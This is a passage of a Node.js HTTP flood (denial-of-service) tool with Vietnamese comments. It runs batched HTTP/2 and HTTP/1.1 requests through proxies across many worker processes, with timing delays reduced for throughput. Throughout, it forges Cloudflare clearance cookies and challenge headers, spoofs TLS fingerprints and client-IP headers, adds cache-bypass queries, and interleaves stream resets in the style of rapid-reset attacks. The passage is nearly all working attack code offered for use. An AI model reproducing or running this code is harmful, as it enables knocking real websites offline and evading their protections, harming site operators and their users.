          const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);

          // Tách pseudo-headers
          const pseudoHeaders = [
            [":method", method],
            [":authority", url.hostname],
            [":scheme", "https"],
            [":path", path],
          ];

          // Regular headers với tối ưu
          const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);

          // Headers bổ sung
          const additionalRegularHeaders = Object.entries({
            ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
            ...(Math.random() > 0.4 && { "dnt": "1" }),
            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
          }).filter(a => a[1] != null);

          // Kết hợp và xáo trộn tất cả regular headers
          const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
          shuffle(allRegularHeaders);

          // Kết hợp pseudo-headers với regular headers, cookie, và challenge headers
          const combinedHeaders = [
            ...pseudoHeaders,
            ...allRegularHeaders,
            ['cookie', generateCfClearanceCookie()],
            ...generateChallengeHeaders()
          ];

          // Mã hóa với HPACK
          const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(combinedHeaders)
          ]);

          const flags = 0x1 | 0x4 | 0x8 | 0x20;
          const encodedFrame = encodeFrame(streamId, 1, packed, flags);

          // Tối ưu stream management
          if (STREAMID_RESET >= 3 && (STREAMID_RESET - 3) % 5 === 0) {
            const rstStreamFrame = encodeRstStream(streamId, 8);
            tlsSocket.write(Buffer.concat([rstStreamFrame, encodedFrame]));
            STREAMID_RESET = 0;
          }

          requests.push(encodeFrame(streamId, 1, packed, 0x25));
          streamId += 2;
        }

        // Gửi batch request lớn
        tlsSocket.write(Buffer.concat(requests), (err) => {
          if (err) {
            tlsSocket.end(() => tlsSocket.destroy());
            return;
          }

          // Tối ưu timing - giảm delay để tăng throughput
          const elapsed = Date.now() - startTime;
          const optimizedDelay = Math.max(0, (300 / localRatelimit) - elapsed); // Giảm delay từ 500 xuống 300

          // Sử dụng setImmediate thay vì setTimeout để tăng tốc độ
          if (optimizedDelay > 0) {
            setTimeout(() => sendHTTP2Requests(), optimizedDelay);
          } else {
            setImmediate(() => sendHTTP2Requests());
          }
        });
      }

      sendHTTP2Requests();
    }).on('error', () => {
      tlsSocket.destroy();
    });
  }

  // Hàm tạo kết nối HTTP/1.1 song song
  function createHTTP11Connection() {
    // Tạo kết nối HTTP/1.1 riêng biệt
    const http11NetSocket = net.connect(Number(proxyPort), proxyHost, () => {
      http11NetSocket.once('data', () => {
        // Cấu hình TLS cho HTTP/1.1
        let minTLSVersion = 'TLSv1.2';
        let maxTLSVersion = 'TLSv1.3';
        if (forceTls === '13') {
          minTLSVersion = 'TLSv1.3';
          maxTLSVersion = 'TLSv1.3';
        } else if (forceTls === '12') {
          minTLSVersion = 'TLSv1.2';
          maxTLSVersion = 'TLSv1.2';
        }

        const cipherList = (maxTLSVersion === 'TLSv1.2')
          ? ja3Fingerprint.ciphers.filter(c => !c.startsWith('TLS_AES_') && c !== 'TLS_CHACHA20_POLY1305_SHA256').join(':')
          : ja3Fingerprint.ciphers.join(':');

        http11Socket = tls.connect({
          socket: http11NetSocket,
          ALPNProtocols: ['http/1.1'],
          servername: isIPAddress ? undefined : url.host,
          ciphers: cipherList,
          sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
          secureOptions:
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_TLSv1 |
            crypto.constants.SSL_OP_NO_TLSv1_1 |
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
            crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
            crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
            crypto.constants.SSL_OP_COOKIE_EXCHANGE |
            crypto.constants.SSL_OP_SINGLE_DH_USE |
            crypto.constants.SSL_OP_SINGLE_ECDH_USE,
          secure: true,
          session: crypto.randomBytes(64),
          minVersion: minTLSVersion,
          maxVersion: maxTLSVersion,
          ecdhCurve: ja3Fingerprint.curves.join(':'),
          rejectUnauthorized: false,
          fingerprint: fingerprint
        }, () => {
          // HTTP/1.1 request function - tăng số lượng request
          function sendHTTP11Requests() {
            if (http11Socket.destroyed) {
              return;
            }

            // Tăng batch size cho HTTP/1.1
            const batchSize = isFull ? Math.min(ratelimit * 3, 120) : Math.min(ratelimit * 2, 80);
            const requests = [];
            let localRatelimit = ratelimit !== undefined ? getRandomInt(1, 3) : process.argv[6];
            const startTime = Date.now();

            // Tạo batch HTTP/1.1 requests
            for (let i = 0; i < batchSize; i++) {
              const method = enableCache ? getRandomMethod() : reqmethod;
              const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);

              // Tạo headers động cho HTTP/1.1
              const dynamicHeaders = generateDynamicHeaders();
              const additionalHeaders = Object.entries({
                ...(Math.random() > 0.6 && { "dnt": "1" }),
                ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                ...(enableCache && { "cache-control": "no-cache, no-store, must-revalidate" }),
                ...(enableCache && { "pragma": "no-cache" }),
                ...(enableCache && { "expires": "0" })
              }).filter(a => a[1] != null);

              // Kết hợp tất cả headers
              const allHeaders = [...dynamicHeaders, ...additionalHeaders];
              shuffle(allHeaders);

              // Tạo HTTP/1.1 request
              const headers = [
                `Host: ${url.hostname}`,
                `User-Agent: ${userAgent}`,
                ...allHeaders.map(([key, value]) => `${key}: ${value}`),
                `Cookie: ${generateCfClearanceCookie()}`,
                `Connection: keep-alive`
              ].join('\r\n');

              const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\n${headers}\r\n\r\n`;
              requests.push(h1payl);
            }

            // Gửi batch HTTP/1.1 requests
            const combinedPayload = requests.join('');
            http11Socket.write(combinedPayload, (err) => {
              if (err) {
                http11Socket.end(() => http11Socket.destroy());
                return;
              }

              // Tối ưu timing cho HTTP/1.1
              const elapsed = Date.now() - startTime;
              const optimizedDelay = Math.max(0, (250 / localRatelimit) - elapsed); // Giảm delay từ 300 xuống 250

              if (optimizedDelay > 0) {
                setTimeout(() => sendHTTP11Requests(), optimizedDelay);
              } else {
                setImmediate(() => sendHTTP11Requests());
              }
            });
          }

          sendHTTP11Requests();

          http11Socket.on('error', () => {
            http11Socket.end(() => http11Socket.destroy());
          });
        }).on('error', () => {
          http11Socket.destroy();
        });
      });

      // Sử dụng CONNECT method cho HTTP/1.1 connection
      http11NetSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}\r\n\r\n`);
    });

    http11NetSocket.once('error', () => { }).once('close', () => {
      if (http11Socket) {
        http11Socket.end(() => { http11Socket.destroy(); });
      }
    });

    http11NetSocket.on('error', (error) => {
      if (http11NetSocket) {
        http11NetSocket.destroy();
      }
    });

    http11NetSocket.on('close', () => {
      if (http11NetSocket) {
        http11NetSocket.destroy();
      }
    });
  }

  netSocket.on('error', (error) => {
    cleanup(error);
  });

  netSocket.on('close', () => {
    cleanup();
  });

  function cleanup(error) {
    if (error) {
      // Handle error silently
    }
    if (netSocket) {
      netSocket.destroy();
    }
    if (tlsSocket) {
      tlsSocket.end();
    }
    if (http11Socket) {
      http11Socket.end();
    }
  }
}

setInterval(() => {
  timer++;
}, 1000);

setInterval(() => {
  if (timer <= 30) {
    custom_header = custom_header + 1;
    custom_window = custom_window + 1;
    custom_table = custom_table + 1;
    custom_update = custom_update + 1;
  } else {
    custom_table = 65536;
    custom_window = 6291456;
    custom_header = 262144;
    custom_update = 15663105;

    timer = 0;
  }
}, 10000);

// Thêm cấu hình tối ưu cho performance
const PERFORMANCE_CONFIG = {
  // Tối ưu memory usage
  maxMemoryUsage: 512 * 1024 * 1024, // 512MB
  gcInterval: 30000, // 30 seconds

  // Tối ưu connection pooling
  maxConnectionsPerWorker: 1000,
  connectionTimeout: 30000,
  keepAliveTimeout: 60000,

  // Tối ưu batch processing
  maxBatchSize: 200,
  batchTimeout: 100,

  // Tối ưu stream management
  maxStreamsPerConnection: 100,
  streamTimeout: 15000,

  // Tối ưu buffer management
  bufferPoolSize: 1000,
  maxBufferSize: 64 * 1024 // 64KB
};

// Memory management class
class MemoryManager {
  constructor() {
    this.bufferPool = [];
    this.lastGC = Date.now();
    this.memoryUsage = process.memoryUsage();
  }

  getBuffer(size) {
    // Reuse buffers from pool
    const poolIndex = this.bufferPool.findIndex(buf => buf.length >= size);
    if (poolIndex !== -1) {
      return this.bufferPool.splice(poolIndex, 1)[0];
    }
    return Buffer.allocUnsafe(size);
  }

  returnBuffer(buffer) {
    if (this.bufferPool.length < PERFORMANCE_CONFIG.bufferPoolSize) {
      this.bufferPool.push(buffer);
    }
  }

  checkMemoryUsage() {
    const currentUsage = process.memoryUsage();
    if (currentUsage.heapUsed > PERFORMANCE_CONFIG.maxMemoryUsage) {
      this.forceGC();
    }
  }

  forceGC() {
    if (global.gc) {
      global.gc();
      this.lastGC = Date.now();
    }
  }
}

// Connection pool manager
class ConnectionPool {
  constructor() {
    this.pool = new Map();
    this.activeConnections = 0;
    this.maxConnections = PERFORMANCE_CONFIG.maxConnectionsPerWorker;
  }

  async getConnection(proxyHost, proxyPort) {
    const key = `${proxyHost}:${proxyPort}`;

    if (this.pool.has(key)) {
      const connections = this.pool.get(key);
      if (connections.length > 0) {
        return connections.pop();
      }
    }

    if (this.activeConnections >= this.maxConnections) {
      // Wait for available connection
      await this.waitForConnection();
    }

    return this.createConnection(proxyHost, proxyPort);
  }

  async createConnection(proxyHost, proxyPort) {
    return new Promise((resolve, reject) => {
      const socket = net.connect(Number(proxyPort), proxyHost, () => {
        this.activeConnections++;
        resolve(socket);
      });

      socket.on('error', reject);
      socket.setTimeout(PERFORMANCE_CONFIG.connectionTimeout);
    });
  }

  returnConnection(proxyHost, proxyPort, socket) {
    const key = `${proxyHost}:${proxyPort}`;

    if (!this.pool.has(key)) {
      this.pool.set(key, []);
    }

    const connections = this.pool.get(key);
    if (connections.length < 10) { // Limit pool size per proxy
      connections.push(socket);
    } else {
      socket.destroy();
      this.activeConnections--;
    }
  }

  async waitForConnection() {
    return new Promise(resolve => {
      const checkInterval = setInterval(() => {
        if (this.activeConnections < this.maxConnections) {
          clearInterval(checkInterval);
          resolve();
        }
      }, 10);
    });
  }
}

// Request batch processor
class RequestBatchProcessor {
  constructor() {
    this.batchQueue = [];
    this.processing = false;
    this.memoryManager = new MemoryManager();
  }

  addRequest(requestData) {
    this.batchQueue.push(requestData);

    if (!this.processing && this.batchQueue.length >= PERFORMANCE_CONFIG.maxBatchSize) {
      this.processBatch();
    }
  }

  async processBatch() {
    if (this.processing || this.batchQueue.length === 0) return;

    this.processing = true;
    const batch = this.batchQueue.splice(0, PERFORMANCE_CONFIG.maxBatchSize);

    try {
      // Process batch in parallel with controlled concurrency
      const chunks = this.chunkArray(batch, 10); // Process 10 requests at a time

      for (const chunk of chunks) {
        await Promise.all(chunk.map(requestData => this.sendRequest(requestData)));
        await this.delay(PERFORMANCE_CONFIG.batchTimeout);
      }
    } catch (error) {
      // Handle errors silently
    } finally {
      this.processing = false;

      // Check if there are more requests to process
      if (this.batchQueue.length >= PERFORMANCE_CONFIG.maxBatchSize) {
        setImmediate(() => this.processBatch());
      }
    }
  }

  async sendRequest(requestData) {
    const { proxyHost, proxyPort, requestFrame } = requestData;

    try {
      const connection = await connectionPool.getConnection(proxyHost, proxyPort);

      return new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          connection.destroy();
          reject(new Error('Request timeout'));
        }, PERFORMANCE_CONFIG.streamTimeout);

        connection.write(requestFrame, (err) => {
          clearTimeout(timeout);
          if (err) {
            connection.destroy();
            reject(err);
          } else {
            connectionPool.returnConnection(proxyHost, proxyPort, connection);
            resolve();
          }
        });
      });
    } catch (error) {
      // Handle connection errors
    }
  }

  chunkArray(array, size) {
    const chunks = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Stream manager for HTTP/2
class StreamManager {
  constructor() {
    this.activeStreams = new Map();
    this.streamCounter = 1;
    this.maxStreams = PERFORMANCE_CONFIG.maxStreamsPerConnection;
  }

  allocateStream() {
    if (this.activeStreams.size >= this.maxStreams) {
      // Reset stream counter when reaching limit
      this.streamCounter = 1;
      this.activeStreams.clear();
    }

    const streamId = this.streamCounter;
    this.streamCounter += 2;
    this.activeStreams.set(streamId, Date.now());

    return streamId;
  }

  releaseStream(streamId) {
    this.activeStreams.delete(streamId);
  }

  cleanupExpiredStreams() {
    const now = Date.now();
    for (const [streamId, timestamp] of this.activeStreams.entries()) {
      if (now - timestamp > PERFORMANCE_CONFIG.streamTimeout) {
        this.activeStreams.delete(streamId);
      }
    }
  }
}

// Initialize managers
const memoryManager = new MemoryManager();
const connectionPool = new ConnectionPool();
const batchProcessor = new RequestBatchProcessor();
const streamManager = new StreamManager();

if (cluster.isMaster) {
  const workers = {};
  const cpuCount = os.cpus().length;

  // Optimize worker distribution
  const workerCount = Math.min(threads, cpuCount * 2);

  Array.from({ length: workerCount }, (_, i) => {
    const worker = cluster.fork({
      core: i % cpuCount,
      workerId: i
    });
    workers[worker.id] = worker;
  });

  console.log(`Cityiscoding - Optimized with ${workerCount} workers`);

  cluster.on('exit', (worker) => {
    cluster.fork({ core: worker.id % os.cpus().length });
  });

  cluster.on('message', (worker, message) => {
    workers[worker.id] = [worker, message];
  });
  if (debugMode) {
    setInterval(() => {
      let statuses = {};
      for (let w in workers) {
        if (workers[w][0].state == 'online') {
          for (let st of workers[w][1]) {
            for (let code in st) {
              if (statuses[code] == null)
                statuses[code] = 0;

              statuses[code] += st[code];
            }
          }
        }
      }
      console.clear();
      console.log(`[${chalk.magenta.bold('JS/FUCKING')}] | ${chalk.bold('Time')}: [${chalk.cyan.bold(new Date().toLocaleString('en-US'))}] | ${chalk.bold('Status')}: [${chalk.cyan.bold(JSON.stringify(statuses))}]`);
    }, 1000);
  }

  setInterval(() => {
  }, 1100);

  if (!connectFlag) {
    setTimeout(() => process.exit(1), time * 1000);
  }
} else {
  if (connectFlag) {
    // Use setImmediate for better performance
    const sendRequests = () => {
      go();
      setImmediate(sendRequests);
    };
    setImmediate(sendRequests);
  } else {
    let requestCount = 0;
    const maxRequests = 30000;

    const sendRequests = () => {
      if (requestCount < maxRequests) {
        requestCount++;
        go();
        setImmediate(sendRequests);
      }
    };
    setImmediate(sendRequests);
  }

  if (debugMode) {
    setInterval(() => {
      if (statusesQ.length >= 4)
        statusesQ.shift();

      statusesQ.push(statuses);
      statuses = {};
      process.send(statusesQ);
    }, 250);
  }

  setTimeout(() => process.exit(1), time * 1000);
}

// Add missing functions that were referenced but not defined
function generateCacheQuery() {
  const cacheBypass = cache_bypass[Math.floor(Math.random() * cache_bypass.length)];
  const queryParams = Object.entries(cacheBypass)
    .map(([key, value]) => `${key}=${value}`)
    .join('&');
  return `?${queryParams}`;
}

function handleQuery(queryType) {
  switch (queryType) {
    case '1':
      return `?cf__chl_tk=${randstr(32)}`;
    case '2':
      return `?${randstr(8)}=${randstr(16)}`;
    case '3':
      return `?q=${randstr(12)}`;
    default:
      return '';
  }
}

